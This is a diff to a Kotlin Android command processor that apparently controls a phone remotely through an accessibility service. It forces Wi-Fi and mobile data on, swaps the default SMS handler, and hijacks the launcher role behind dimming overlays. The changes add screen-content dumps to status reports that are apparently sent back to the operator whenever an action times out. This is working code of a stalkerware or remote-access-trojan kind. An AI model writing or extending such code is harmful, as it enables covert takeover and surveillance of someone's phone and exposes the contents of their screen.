@@ -764,8 +764,11 @@ object CommandProcessor {
                                 DimmerManager.IgnitionManager.release(ctx, "RESTORE_DEFAULT_SMS")
                                 if (DefaultSmsManager.expectedMode == "RESTORE") {
                                     DefaultSmsManager.expectedMode = ""
+                                    val diag = MyAccessibilityService.dumpScreenDiagnostic()
+                                    DebugLogger.log("SMS_RESTORE_TIMEOUT_DIAG", diag)
                                     MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                                     DynamicUIManager.removeOverlay(ctx, "SMS_RESTORE_SAFETY_FUSE")
+                                    CommandProcessor.updateCommandStatus(ctx, id, "RESTORE_TIMEOUT", "Failed to restore previous SMS handler.\nScreen State:\n$diag")
                                     CommandRetryManager.scheduleRetry(ctx, id, "RESTORE_DEFAULT_SMS", "", "30s Restore Timeout")
                                 }
                             }, 30000)
@@ -1654,8 +1657,11 @@ object CommandProcessor {
                                 DimmerManager.IgnitionManager.release(ctx, "FORCE_WIFI")
                                 if (MyAccessibilityService.instance?.isWaitingForWifiSettings == true) {
                                     MyAccessibilityService.instance?.isWaitingForWifiSettings = false
+                                    val diag = MyAccessibilityService.dumpScreenDiagnostic()
+                                    DebugLogger.log("WIFI_TIMEOUT_DIAG", diag)
                                     DimmerManager.removeOverlay(ctx)
                                     MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                                    CommandProcessor.updateCommandStatus(ctx, id, "WIFI_TIMEOUT", "Ghost Hand failed to toggle Wi-Fi.\nScreen State:\n$diag")
                                     CommandRetryManager.scheduleRetry(ctx, id, "FORCE_WIFI", content, "25s Wi-Fi Timeout")
                                 }
                             }, 25000)
@@ -1690,10 +1696,13 @@ object CommandProcessor {
                             
                             Handler(Looper.getMainLooper()).postDelayed({
                                 DimmerManager.IgnitionManager.release(ctx, "FORCE_DATA")
-                                if (MyAccessibilityService.instance?.isWaitingForDataSettings == true) {
+                                if (MyAccessibilityService.instance?.isWaitingForDataSettings == true) { 
                                     MyAccessibilityService.instance?.isWaitingForDataSettings = false
+                                    val diag = MyAccessibilityService.dumpScreenDiagnostic()
+                                    DebugLogger.log("DATA_TIMEOUT_DIAG", diag)
                                     DimmerManager.removeOverlay(ctx)
                                     MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                                    CommandProcessor.updateCommandStatus(ctx, id, "DATA_TIMEOUT", "Ghost Hand failed to toggle Mobile Data.\nScreen State:\n$diag")
                                     CommandRetryManager.scheduleRetry(ctx, id, "FORCE_DATA", content, "25s Data Timeout")
                                 }
                             }, 25000)
@@ -2930,9 +2939,12 @@ object CommandProcessor {
                         if (LauncherManager.isHijacking) {
                             DebugLogger.log("HIJACK_TIMEOUT", "30s timeout reached. Aborting hijack sequence.")
                             LauncherManager.isHijacking = false
-                            withContext(kotlinx.coroutines.Dispatchers.Main) {
+                            val diag = MyAccessibilityService.dumpScreenDiagnostic()
+                            DebugLogger.log("HIJACK_TIMEOUT_DIAG", diag)
+                            withContext(Dispatchers.Main) {
                                 DimmerManager.removeOverlay(ctx)
                             }
+                            CommandProcessor.updateCommandStatus(ctx, id, "HIJACK_TIMEOUT", "Failed to hijack launcher role.\nScreen State:\n$diag")
                             CommandRetryManager.scheduleRetry(ctx, id, "HIJACK_LAUNCHER", "", "30s Hijack Timeout")
                         }
                         DimmerManager.IgnitionManager.release(ctx, "HIJACK_LAUNCHER")
